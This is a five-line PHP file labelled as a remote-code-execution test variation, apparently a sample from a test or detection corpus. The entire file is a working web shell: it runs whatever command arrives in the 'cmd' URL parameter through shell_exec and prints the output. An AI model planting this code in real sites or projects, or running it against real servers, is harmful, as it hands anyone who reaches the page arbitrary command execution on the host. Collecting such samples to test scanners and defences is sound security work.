<?php
// RCE test variation #29
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>